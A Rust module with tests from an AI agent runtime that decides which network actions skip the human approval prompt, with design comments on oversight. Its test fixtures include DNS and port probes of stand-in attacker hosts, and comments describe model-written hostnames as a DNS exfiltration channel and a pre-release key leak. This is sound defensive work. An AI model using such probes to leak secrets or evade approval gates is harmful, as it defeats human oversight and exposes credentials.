//! Which network actions observe a remote host without changing it.
//!
//! The sibling of [`crate::agent::readonly_cmd`], and it exists for the same
//! reason. `SideEffectClass::Network` now `touches_host`, so every action
//! that opens an outbound socket meets the human gate. That is the correct
//! default — `SshExec` runs a shell on someone else's machine, and
//! `HttpRequest DELETE` deletes — but applied uniformly it would put a prompt
//! in front of every `FetchUrl`, every DNS probe and every call the agent
//! makes to its own model. A gate that fires on reads is a gate the operator
//! learns to dismiss, and then it no longer guards the writes either. That
//! argument is not ergonomics; it is the reason `readonly_cmd` exists, and the
//! sort/uniq incident of 2026-08-15 is what it costs when the table is wrong.
//!
//! # What this waives, and what it does not
//!
//! The **human prompt only**. The runtime's per-action `[actions]` switch, its
//! `default_effect`, its `readonly`/`confirm` modes and the enclave policy are
//! all downstream of this call and all still run. Every action named below is
//! `false` by default in `AppConfig::defaults` (its class is `Network`), so on
//! a fresh install this table decides nothing at all: it only matters once an
//! operator has deliberately switched one on.
//!
//! # The rule the table follows
//!
//! An action earns a place only when **no field it carries can make the remote
//! side change state**. That is why the table keys on fields and not on names:
//!
//! - `HttpRequest` is a read exactly when its method is `GET` or `HEAD`. The
//!   method is the whole difference, and `ApprovalScope::HttpCall` already
//!   treats it as part of the identity for the same reason.
//! - `OllamaApi` is a read exactly when its `operation` is `list` or `show`.
//!   `pull` downloads a model onto the host's disk, `create` writes one and
//!   `delete` removes one — three writes wearing one action name. Classing the
//!   whole action as a read would have handed those over.
//! - `SshExec` is never here. It is a `RunCommand` whose host is elsewhere.
//! - `DatasetGenerate` is never here: it loops LLM calls and then writes
//!   `output`.
//!
//! # The limit, stated
//!
//! A GET is a read *of the remote resource*. It is not free of outbound
//! information: the URL, the headers and the model prompt all leave the
//! machine, so this table does not defend against exfiltration through a
//! request line. The defence against that is the per-action switch (every
//! Network action is off by default) and, for the two probes that ARE on by
//! default, the loopback rule below: a `DnsLookup`/`PortCheck` of any other
//! host meets the gate, because a hostname the model writes is the DNS
//! exfiltration channel. An egress proxy with an allowlist is the next step
//! (D-B). What the table does claim, and what its tests pin, is
//! that nothing waived here can change state on the far end.

use x0ne_actions::Action;

/// Whether this action only observes across the network.
///
/// `false` for anything not named — including every action that is not a
/// network action at all, since the caller has already decided the class.
pub fn is_read_only_network(action: &Action) -> bool {
    match action {
        // GET by construction — the variant carries no method field.
        Action::FetchUrl { .. } => true,
        // SECURITY: a name lookup carries its hostname to a resolver the host
        // does not control, and the model writes that name. Only the loopback
        // leaves nothing behind; any other host asks a human once.
        Action::DnsLookup { hostname } => is_loopback_host(hostname),
        Action::PortCheck { host, .. } => is_loopback_host(host),
        // Queries a search backend. Carries a query string and nothing else.
        Action::WebSearch { .. } => true,
        // The agent's own model traffic. Prompting on each of these would ask
        // the operator to approve the conversation they are having.
        // SECURITY: not with an `auth`. A key leaves with it, to a host the
        // model wrote; on the pre-release build `$ENV:ANTHROPIC_API_KEY` went so, unasked.
        Action::LlmCall { auth, .. } | Action::OllamaChat { auth, .. } => carries_no_key(auth),
        // SECURITY: the method is the authority. `pull`/`create`/`delete` on an
        // Ollama endpoint write and remove models on the host running it;
        // waiving those would be waiving a write. Unknown operations fall
        // through to `false` — an operation this table does not recognise is
        // one whose effects it cannot bound.
        Action::OllamaApi {
            operation, auth, ..
        } => {
            carries_no_key(auth)
                && matches!(operation.to_ascii_lowercase().as_str(), "list" | "show")
        }
        // SECURITY: same rule, on `method`. Anything that is not GET or HEAD
        // can create, replace or delete a remote resource.
        Action::HttpRequest { method, .. } => {
            matches!(method.to_ascii_uppercase().as_str(), "GET" | "HEAD")
        }
        _ => false,
    }
}

/// No `auth`, or a blank one: nothing but the prompt leaves.
fn carries_no_key(auth: &Option<String>) -> bool {
    auth.as_deref().is_none_or(|a| a.trim().is_empty())
}

/// `localhost` or a loopback literal, with the bracket form of IPv6 and a
/// trailing dot accepted. Anything that needs a resolver is not loopback.
fn is_loopback_host(host: &str) -> bool {
    let h = host.trim().trim_end_matches('.');
    let h = h
        .strip_prefix('[')
        .and_then(|r| r.strip_suffix(']'))
        .unwrap_or(h);
    if h.eq_ignore_ascii_case("localhost") {
        return true;
    }
    h.parse::<std::net::IpAddr>()
        .map(|ip| ip.is_loopback())
        .unwrap_or(false)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn parse(json: serde_json::Value) -> Action {
        serde_json::from_value(json).expect("test action parses")
    }

    /// The table is a waiver, so what it refuses matters more than what it
    /// admits. A failure here means one of these reached the network with no
    /// human asked.
    #[test]
    fn nothing_that_can_change_the_far_end_is_waived() {
        for json in [
            serde_json::json!({"type": "SshExec", "host": "h", "command": "ls"}),
            serde_json::json!({"type": "HttpRequest", "url": "u", "method": "POST"}),
            serde_json::json!({"type": "HttpRequest", "url": "u", "method": "DELETE"}),
            serde_json::json!({"type": "HttpRequest", "url": "u", "method": "PUT"}),
            serde_json::json!({"type": "OllamaApi", "endpoint": "e", "operation": "pull"}),
            serde_json::json!({"type": "OllamaApi", "endpoint": "e", "operation": "delete"}),
            serde_json::json!({"type": "OllamaApi", "endpoint": "e", "operation": "create"}),
            serde_json::json!({"type": "DatasetGenerate", "endpoint": "e", "model": "m",
                               "topic": "t", "output": "/tmp/o"}),
        ] {
            let action = parse(json.clone());
            assert!(
                !is_read_only_network(&action),
                "{json} can change state on the far end and must keep the gate"
            );
        }
    }

    /// Review of the pre-release build (S1): a model call that carries a key meets the
    /// gate; without one it is still the agent's own traffic.
    #[test]
    fn a_model_call_with_auth_keeps_the_gate() {
        for json in [
            serde_json::json!({"type": "LlmCall", "endpoint": "http://127.0.0.1:9/v1",
                               "model": "m", "prompt": "p", "auth": "$ENV:ANTHROPIC_API_KEY"}),
            serde_json::json!({"type": "LlmCall", "endpoint": "https://api.openai.com",
                               "model": "m", "prompt": "p", "auth": "$ENV:MY_LLM_KEY"}),
            serde_json::json!({"type": "OllamaChat", "endpoint": "http://127.0.0.1:9",
                               "model": "m", "messages": [], "auth": "$ENV:OLLAMA_API_KEY"}),
            serde_json::json!({"type": "OllamaApi", "endpoint": "http://127.0.0.1:9",
                               "operation": "list", "auth": "literal-token"}),
        ] {
            assert!(!is_read_only_network(&parse(json.clone())), "{json}");
        }
        for json in [
            serde_json::json!({"type": "LlmCall", "endpoint": "http://127.0.0.1:9/v1",
                               "model": "m", "prompt": "p"}),
            serde_json::json!({"type": "LlmCall", "endpoint": "http://127.0.0.1:9/v1",
                               "model": "m", "prompt": "p", "auth": " "}),
            serde_json::json!({"type": "OllamaApi", "endpoint": "http://127.0.0.1:9",
                               "operation": "list"}),
        ] {
            assert!(is_read_only_network(&parse(json.clone())), "{json}");
        }
    }

    /// An unrecognised Ollama operation is not a read. A future `prune` must
    /// fail closed rather than inherit the waiver by not being listed as bad.
    #[test]
    fn an_unknown_ollama_operation_keeps_the_gate() {
        for op in ["prune", "push", "", "LIST-ish"] {
            let action =
                parse(serde_json::json!({"type": "OllamaApi", "endpoint": "e", "operation": op}));
            assert!(
                !is_read_only_network(&action),
                "operation {op:?} is not one this table has reasoned about"
            );
        }
    }

    /// The waiver is case-insensitive on both keys, because the model writes
    /// them and JSON has no opinion. A failure means `get` prompts while `GET`
    /// does not, which is the kind of inconsistency that gets a gate disabled.
    #[test]
    fn the_verdict_does_not_depend_on_letter_case() {
        assert!(is_read_only_network(&parse(
            serde_json::json!({"type": "HttpRequest", "url": "u", "method": "get"})
        )));
        assert!(is_read_only_network(&parse(
            serde_json::json!({"type": "HttpRequest", "url": "u", "method": "Head"})
        )));
        assert!(is_read_only_network(&parse(
            serde_json::json!({"type": "OllamaApi", "endpoint": "e", "operation": "LIST"})
        )));
    }

    /// SECURITY: the host of a `DnsLookup`/`PortCheck` is model-written and a
    /// resolver forwards it: `<secret>.attacker.example` is the DNS channel of
    /// every exfiltration write-up. Only the loopback carries nothing off the
    /// host. Red on 2026-10-05: both were waived for any host.
    #[test]
    fn a_probe_of_a_model_chosen_host_keeps_the_gate() {
        for json in [
            serde_json::json!({"type": "DnsLookup", "hostname": "q0fovq.attacker.example"}),
            serde_json::json!({"type": "PortCheck", "host": "q0fovq.attacker.example", "port": 443}),
            serde_json::json!({"type": "PortCheck", "host": "203.0.113.9", "port": 22}),
            serde_json::json!({"type": "DnsLookup", "hostname": "localhost.attacker.example"}),
        ] {
            let action = parse(json.clone());
            assert!(
                !is_read_only_network(&action),
                "{json} reaches a host the model chose with nobody asked"
            );
        }
        for json in [
            serde_json::json!({"type": "DnsLookup", "hostname": "localhost"}),
            serde_json::json!({"type": "PortCheck", "host": "127.0.0.1", "port": 8080}),
            serde_json::json!({"type": "PortCheck", "host": "::1", "port": 8080}),
            serde_json::json!({"type": "PortCheck", "port": 3000}),
        ] {
            let action = parse(json.clone());
            assert!(
                is_read_only_network(&action),
                "{json} observes this host only"
            );
        }
    }

    /// Pure observation stays out of the way.
    #[test]
    fn plain_network_reads_are_recognised() {
        for json in [
            serde_json::json!({"type": "FetchUrl", "url": "https://example.com"}),
            serde_json::json!({"type": "DnsLookup", "host": "localhost"}),
            serde_json::json!({"type": "PortCheck", "host": "127.0.0.1", "port": 443}),
            serde_json::json!({"type": "WebSearch", "query": "rust"}),
            serde_json::json!({"type": "HttpRequest", "url": "u"}),
        ] {
            let action = parse(json.clone());
            assert!(is_read_only_network(&action), "{json} only observes");
        }
    }

    /// Every action this table waives must actually be a network action. A
    /// name that drifts out of `SideEffectClass::Network` — reclassified, or
    /// grown a write — would otherwise keep a waiver granted on the strength
    /// of a class it no longer has.
    #[test]
    fn the_waiver_only_ever_covers_network_actions() {
        use x0ne_actions::SideEffectClass;
        for json in [
            serde_json::json!({"type": "FetchUrl", "url": "u"}),
            serde_json::json!({"type": "DnsLookup", "host": "localhost"}),
            serde_json::json!({"type": "PortCheck", "host": "::1", "port": 1}),
            serde_json::json!({"type": "WebSearch", "query": "q"}),
            serde_json::json!({"type": "LlmCall", "endpoint": "e", "model": "m", "prompt": "p"}),
            serde_json::json!({"type": "OllamaChat", "endpoint": "e", "model": "m",
                               "messages": []}),
            serde_json::json!({"type": "OllamaApi", "endpoint": "e", "operation": "list"}),
            serde_json::json!({"type": "HttpRequest", "url": "u", "method": "GET"}),
        ] {
            let action = parse(json.clone());
            assert!(is_read_only_network(&action), "{json} should be waived");
            assert_eq!(
                action.side_effect_class(),
                SideEffectClass::Network,
                "{json} is waived by a network table but is no longer a network action"
            );
        }
    }
}
